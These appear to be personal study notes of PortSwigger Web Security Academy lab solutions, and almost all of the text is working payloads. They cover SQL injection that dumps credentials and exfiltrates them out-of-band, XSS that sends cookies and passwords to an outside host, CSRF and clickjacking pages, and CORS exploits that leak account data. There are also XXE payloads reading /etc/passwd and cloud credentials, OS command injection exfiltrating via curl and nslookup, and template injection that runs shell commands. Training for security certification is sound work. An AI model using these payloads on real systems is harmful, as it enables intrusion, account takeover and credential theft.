---
title: PortSwigger Web Security Labs
date: 2026-02-03
categories: [BSCP]
tags: [web]
description: "Note for Web Security Labs"
---

## SQL Injection
### Cheat Sheet
- Cheat Sheet can be found [here](https://portswigger.net/web-security/sql-injection/cheat-sheet).

### Notes
To do further injection, the first thing we should check is the number of columns. We can use this query `' ORDER BY {number}`, and if we see the server is crashed, for example, when injecting `' ORDER BY 3`, it means that the database has 2 columns. Most of the labs here have 2 columns.

### Labs
- Useful resources from AI can be found [here](https://chatgpt.com/share/6984ac5e-6544-800d-84c1-02420cc47e47).

```sql
-- used to retrieve hidden data and bypass authentication
OR 1=1 -- -
-- querying the database type and version on Oracle
UNION SELECT NULL, banner FROM v$version -- -
-- querying the database type and version on MySQL and Microsoft
UNION SELECT NULL, @@version -- -
-- listing the database contents on non-Oracle databases
UNION SELECT NULL, schema_name FROM information_schema.schemata -- - list databases
UNION SELECT NULL, table_name FROM information_schema.tables WHERE table_schema='dbname' -- - list tables in a database
UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='table_name' -- - list columns in a table
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- listing the database contents on Oracle
UNION SELECT NULL, banner FROM v$version -- - same as show version but can skip to list tables
UNION SELECT NULL, table_name FROM all_tables -- - list tables
UNION SELECT NULL, column_name FROM all_tab_columns WHERE table_name='table_name' -- - list columns
UNION SELECT column1, column2 FROM table_name -- - dump datas
-- determining the number of columns returned by the query
UNION SELECT NULL, NULL, NULL FROM information_schema.schemata -- -
-- finding a column containing text
UNION SELECT 1, 'JqsAUV', 1 FROM information_schema.schemata -- - if give string value to a column and the server is crashed, it means that column is int
-- retrieving data from other tables
UNION SELECT username, password FROM users -- -
-- retrieving multiple values in a single column
UNION SELECT 1, CONCAT(username, password) FROM users -- - 
-- Blind SQL injection with conditional responses
AND (SELECT 'x' FROM information_schema.tables WHERE table_name='users')='x' -- - verify if table exists
AND (SELECT 'x' FROM users WHERE username='administrator')='x' -- - confirm if user exists
AND (SELECT LENGTH(password) FROM users WHERE username='administrator')=20 -- - get password's length
AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='8' -- - bruteforce password char by char
-- Blind SQL injection with conditional errors (oracle)
AND (SELECT CASE WHEN 1=1 THEN TO_CHAR(1/0) ELSE NULL END FROM dual) IS NULL -- - confirming the error
AND (SELECT CASE WHEN (LENGTH(password)=20) THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - check password length
AND (SELECT CASE WHEN (SUBSTR(password, 1, 1)='c') THEN TO_CHAR(1/0) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- - bruteforce password char by char
-- Visible error-based SQL injection (postgreSQL)
AND 1=CAST((SELECT username from users LIMIT 1) AS int) -- - get username
AND 1=CAST((SELECT password from users LIMIT 1) AS int) -- - get password
-- Blind SQL injection with time delays (postgreSQL)
AND (SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE NULL END) IS NULL -- -
-- Blind SQL injection with time delays and information retrieval
AND (SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
AND (SELECT CASE WHEN (SUBSTRING(password,1,1)='1') THEN pg_sleep(10) ELSE NULL END FROM users WHERE username='administrator') IS NULL -- -
-- Blind SQL injection with out-of-band interaction
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://j0knga2di90fioeb8ob35jtkpbv2jw7l.oastify.com/"> %remote;]>'),'/l') FROM dual -- -
-- Blind SQL injection with out-of-band data exfiltration
UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.g0hkg72ai60cile88lb05gthp8vzju7j.oastify.com/"> %remote;]>'),'/l') FROM dual-- -
-- SQL injection with filter bypass via XML encoding
<@hex_entities>1 UNION SELECT username || ':' || password from users</@hex_entities>
```

- Solver for Blind SQL injection with conditional responses can be found [here](/assets/solutions/portswigger/conditional_responses.py).
- Solver for Blind SQL injection with conditional errors can be found [here](/assets/solutions/portswigger/conditional_errors.py).
- Solver for Blind SQL injection with time delays and information retrieval can be found [here](/assets/solutions/portswigger/time_delays.py).

## Cross-site Scripting (XSS)
### Cheat Sheet
- Cheat Sheet can be found [here](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).

### Notes
### Labs
{% raw %}
```html
<!-- Reflected XSS into HTML context with nothing encoded -->
<script>alert(1)</script>
<!-- Stored XSS into HTML context with nothing encoded -->
<script>alert(1)</script>
<!-- DOM XSS in document.write sink using source location.search -->
"><script>alert(1)</script>
<!-- DOM XSS in innerHTML sink using source location.search -->
<img src=x onerror=alert(1)>  
<!-- DOM XSS in jQuery anchor href attribute sink using location.search source -->
javascript:alert(document.cookie)
<!-- DOM XSS in jQuery selector sink using a hashchange event -->
<iframe src="https://0a6500f7048e2ef38082ad5a00ef0041.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
<!-- Reflected XSS into attribute with angle brackets HTML-encoded -->
" onmouseover="alert()"
<!-- Stored XSS into anchor href attribute with double quotes HTML-encoded -->
javascript:alert()
<!-- Reflected XSS into a JavaScript string with angle brackets HTML encoded -->
' ; alert() //
<!-- DOM XSS in document.write sink using source location.search inside a select element -->
1</option><script>alert('asuran')</script>
<!-- DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded -->
{{ $eval.constructor('alert()')() }}
<!-- Reflected DOM XSS -->
asuran\"-alert()}//
<!-- Stored DOM XSS -->
<h1><img src='x' onerror=alert()>
<!-- Reflected XSS into HTML context with most tags and attributes blocked -->
<iframe src="https://0a3c00100307ed7b808d129e00f50068.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
<!-- Reflected XSS into HTML context with all tags blocked except custom ones -->
<script>window.location.href = 'https://0a9e007a045b366c80b599d800b100f3.web-security-academy.net/?search=%27%3Ccustom-tag+onfocus%3D%27alert(document.cookie)%27+id%3D%27x%27+tabindex%3D%271%27%3E#x'</script>
<!-- Reflected XSS with some SVG markup allowed -->
<svg><animateTransform onbegin='alert()'>
<!-- Reflected XSS in canonical link tag -->
'accesskey='x'onclick='alert()
<!-- Reflected XSS into a JavaScript string with single quote and backslash escaped -->
</script><script>alert()</script>
<!-- Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped -->
\'+alert() //
<!-- Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped -->
http://lol?&apos;-alert()-&apos;
<!-- Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped -->
${alert()}
<!-- Exploiting cross-site scripting to steal cookies -->
<script>
fetch('https://vdcyxbh2wtenypxyxiadue1z6qch07ow.oastify.com', {
    method: 'POST',
    mode: 'no-cors',
    body:document.cookie
});
</script>
<!-- Exploiting cross-site scripting to capture passwords -->
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://vba1tjxi5uhsnto8jvet7f62htnkbazz.oastify.com', {
method: 'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
<!-- Exploiting XSS to bypass CSRF defenses -->
<script>
    window.addEventListener('DOMContentLoaded', function() {
        var token = document.getElementsByName('csrf')[0].value;

        var data = new FormData();
        data.append('email', 'hacked@lol.com')
        data.append('csrf', token);

        fetch('/my-account/change-email', {
            method: 'POST',
            mode: 'no-cors',
            body: data
        });
    });
</script>
```
{% endraw %}
## Cross-site request forgery (CSRF)
### Notes
### Labs
{% raw %}
```html
<!-- CSRF vulnerability with no defenses -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a19007204cc124680e83f21000b0014.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
<!-- CSRF where token validation depends on request method (Change req method to GET) -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3c002d039ad00b802f0dd00081001d.web-security-academy.net/my-account/change-email">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
<!-- CSRF where token validation depends on token being present (remove csrf param) -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ab900c203a720e980771275005300f4.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
<!-- CSRF where token is not tied to user session (use other users csrf token) -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a5e00f004fe955680a362fc0011004a.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="hidden" name="csrf" value="qA2oBag9lLAhtximpN30JHmmXrQPZUaq" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
<!-- CSRF where token is tied to non-session cookie (first need to inject our csrf cookie through http header injection in the searchbar) -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a08000c03827916806b0307005500e8.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="hidden" name="csrf" value="ZEOD5di4a2aqVeSCN5xFkRMFGaffTqqi" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a08000c03827916806b0307005500e8.web-security-academy.net/?search=lol%0d%0aSet-Cookie:%20csrfKey=QSrWs740iyVb1u69HMFIX2BmQGtpYrqL%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
<!-- CSRF where token is duplicated in cookie (first need to inject our csrf cookie through http header injection in the searchbar) -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a7e0086038bc2518391aa99007100f1.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="hidden" name="csrf" value="lol" />
      <input type="submit" value="Submit request" />
    </form>
    <img src="https://0a7e0086038bc2518391aa99007100f1.web-security-academy.net/?search=hi%0d%0aSet-Cookie:%20csrf=lol%3b%20SameSite=None" onerror="document.forms[0].submit()">
  </body>
</html>
<!-- SameSite Lax bypass via method override -->
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a3700da0342a214801d030e00bb00ce.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="_method" value="POST">
      <input type="hidden" name="email" value="evil&#64;hacked&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
<!-- SameSite Strict bypass via client-side redirect -->
<script>
    document.location = "https://0adc004504d309ae80769a8a00b60096.web-security-academy.net/post/comment/confirmation?postId=../my-account/change-email?email=evil%40hacked.com%26submit=1";
</script>
<!-- SameSite Strict bypass via sibling domain -->

<!-- SameSite Lax bypass via cookie refresh -->
```
{% endraw %}
## Clickjacking
### Notes
### Labs
{% raw %}
```html
<!-- Basic clickjacking with CSRF token protection -->
<style>
  iframe {
  position: relative;
  width: 1000px;
  height: 700px;
  z-index: 2;
  opacity: 0.00001
  }
  div {
  position: absolute;
  top: 515px;
  left: 60px;
  z-index: 1;
  }
</style>
<div>click</div>
<iframe src="https://0a27001d03a1fb8d81d9666400ee006f.web-security-academy.net/my-account"></iframe>
<!-- Clickjacking with form input data prefilled from a URL parameter -->
<style>
  iframe {
  position: relative;
  width: 1000px;
  height: 700px;
  z-index: 2;
  opacity: 0.1
  }
  div {
  position: absolute;
  top: 465px;
  left: 90px;
  z-index: 1;
  }
</style>
<div>click me</div>
<iframe src="https://0a3b00d404d009c3800a0857009c009c.web-security-academy.net/my-account?email=evil@hacked.com"></iframe>
<!-- Clickjacking with a frame buster script -->
<style>
  iframe {
  position: relative;
  width: 1000px;
  height: 700px;
  z-index: 2;
  opacity: 0.1
  }
  div {
  position: absolute;
  top: 460px;
  left: 60px;
  z-index: 1;
  }
</style>
<div>click</div>
<iframe src="https://0a1a00f404291c3381d96107001b009e.web-security-academy.net/my-account?email=evil@hacked.com" sandbox="allow-forms"></iframe>
<!-- Exploiting clickjacking vulnerability to trigger DOM-based XSS -->
<style>
  iframe {
  position: absolute;
  top: -300px; 
  left: 0;
  width: 1200px;
  height: 1000px;
  opacity: 0.0001;
  z-index: 2;
  }
  div {
  position: absolute;
  top: 530px;
  left: 40px;
  z-index: 1;
  }
</style>
<div>click</div>
<iframe src="https://0a3b0070037012c680b90377002f0009.web-security-academy.net/feedback?name=<img src='x' onerror='print()'>&email=lol@lol.com&subject=1&message=2 "></iframe>
<!-- Multistep clickjacking -->
Lab is not available at the moment (17/04/2026)
```
{% endraw %}
## DOM-based vulnerabilities
### Notes
### Labs
- Coming Soon

## Cross-origin resource sharing (CORS)
### Cheat Sheet 
- Cheat Sheet can be found [here](https://portswigger.net/web-security/ssrf/url-validation-bypass-cheat-sheet).

### Notes
### Labs
{% raw %}
```html
<!-- CORS vulnerability with basic origin reflection -->
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a92008803f688ca806e0345006b00cc.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
  location='//exploit-0abf00a703cd88d0807002b7013500a3.exploit-server.net/log?key='+this.responseText;
};
</script>
<!-- CORS vulnerability with trusted null origin -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0abc004404030b5280b6036500ea0072.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://exploit-0a6c004404690be78097022101e1007c.exploit-server.net/log?key='+this.responseText;
};
</script>"></iframe>
<!-- CORS vulnerability with trusted insecure protocols -->
<script>
    document.location="http://stock.0ab1001104ed9db9816566f000740027.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab1001104ed9db9816566f000740027.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a4b00af04f69dcb814a65f101c80090.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
{% endraw %}
## XML external entity (XXE) injection
### Notes
### Labs
{% raw %}
```xml
<!-- Exploiting XXE using external entities to retrieve files -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
<!-- Exploiting XXE to perform SSRF attacks -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
<!-- Blind XXE with out-of-band interaction -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://y986ss8wf27dv9r0fl3pa9qhl8rzfq3f.oastify.com"> ]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
<!-- Blind XXE with out-of-band interaction via XML parameter entities -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://f2iqljkbv4pj487y4qpfge16cxio6fu4.oastify.com"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
<!-- Exploiting blind XXE to exfiltrate data using a malicious external DTD -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a63002903b89a6c8297743201af004b.exploit-server.net/malicious.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
<!-- Exploiting blind XXE to retrieve data via error messages -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a44001203aa653186412e3e016d0074.exploit-server.net/error.dtd"> %xxe;]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
<!-- Exploiting XInclude to retrieve files -->
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
<!-- Exploiting XXE via image file upload -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE example [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg xmlns="http://www.w3.org/2000/svg" height="100" width="100">
  <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
  <text x="50" y="50" text-anchor="middle">&xxe;</text>
</svg>
```
{% endraw %}
- malicious.dtd can be found [here](/assets/solutions/portswigger/malicious.dtd).
- error.dtd can be found [here](/assets/solutions/portswigger/error.dtd).

## Server-side request forgery (SSRF)
### Notes
### Labs
```sh
# Basic SSRF against the local server
http://localhost/admin/delete?username=carlos
# Basic SSRF against another back-end system
http://192.168.0.225:8080/admin/delete?username=carlos
# Blind SSRF with out-of-band detection
- test it in the referer header
# SSRF with blacklist-based input filter
http%3a%2f%2f127.1%2f%25%36%31dmin/delete?username=carlos
# SSRF with filter bypass via open redirection vulnerability
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

## OS command injection
### Notes
### Labs
```sh
# OS command injection, simple case
productId=1&storeId=1;whoami
# Blind OS command injection with time delays
;ping -c 10 127.0.0.1;
# Blind OS command injection with output redirection
;whoami > /var/www/images/whoami.txt;
# Blind OS command injection with out-of-band interaction
;curl https://av9lnin7zi6tjshiejryenukjbp2ds1h.oastify.com;
# Blind OS command injection with out-of-band data exfiltration
;nslookup https://`whoami`.ophzhwhltw07d6bw8xlc81oydpjg77vw.oastify.com;
```

## Server-side template injection
### Note
{% raw %}
- Use this to identify template engin: `${{<%[%'"}}%\`
- ERB: `<%= 7*7 %>`
- Tornado: `{{ 7*7 }}`

### Labs
```java
// Basic server-side template injection (ERB)
<%= system("rm morale.txt") %>
// Basic server-side template injection (code context)
user.name}}{{__import__("os").popen("rm morale.txt").read()}}
// Server-side template injection using documentation (Freemaker JAVA)
<#assign ex="freemarker.template.utility.Execute"?new()>
${ ex("rm morale.txt") }
// Server-side template injection in an unknown language with a documented exploit (Handlebars)
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('rm morale.txt');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
// Server-side template injection with information disclosure via user-supplied objects (django)
{{settings.SECRET_KEY}}
```
{% endraw %}

## Path traversal
### Notes
- `../` double url encode: `%252e%252e%252f`

### Labs
```sh
# File path traversal, simple case
../../../../etc/passwd
# File path traversal, traversal sequences blocked with absolute path bypass
/etc/passwd
# File path traversal, traversal sequences stripped non-recursively
....//....//....//....//etc/passwd
# File path traversal, traversal sequences stripped with superfluous URL-decode
%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd
# File path traversal, validation of start of path
/var/www/images/../../../../etc/passwd
# File path traversal, validation of file extension with null byte bypass
../../../../etc/passwd%00.jpg
```

## Access control vulnerabilities
### Notes
### Labs
```sh
# Unprotected admin functionality
https://0a4d005f0386d796801f6c5f006300b9.web-security-academy.net/administrator-panel
# Unprotected admin functionality with unpredictable URL
https://0abd000c033d1117819175a900f30048.web-security-academy.net/admin-ncwd6z
# User role controlled by request parameter
/admin/delete?username=carlos # (set Cookie: Admin=true)
# User role can be modified in user profile
{"email":"1@1.com", "roleid": 2}
# User ID controlled by request parameter
https://0a3c005c030c5540802235b300ec0068.web-security-academy.net/my-account?id=carlos
# User ID controlled by request parameter, with unpredictable user IDs
https://0a3900bc04bb40e88163a77e002200f9.web-security-academy.net/my-account?id=b7b31d17-ee3f-4dd9-8b02-7f9157d577fc
# User ID controlled by request parameter with data leakage in redirect
https://0ade00c60420793881fb985c00d2002d.web-security-academy.net/my-account?id=carlos
https://0ade00c60420793881fb985c00d2002d.web-security-academy.net/login
# User ID controlled by request parameter with password disclosure
https://0ae5006b03d0546080ee3a42002c0033.web-security-academy.net/my-account?id=administrator
# Insecure direct object references
intercept traffic and modify 2.txt to 1.txt
# URL-based access control can be circumvented
/?username=carlos
X-Original-Url: /admin/delete
# Method-based access control can be circumvented
POSTX /admin-roles?username=wiener&action=upgrade
# Multi-step process with no access control on one step
action=upgrade&confirmed=true&username=wiener
# Referer-based access control
GET /admin-roles?username=wiener&action=upgrade HTTP/
Referer: https://0a590035045fa8b680f3f8cb00ef0050.web-security-academy.net/admin
```

## Authentication
### Notes
### Labs
```sh

```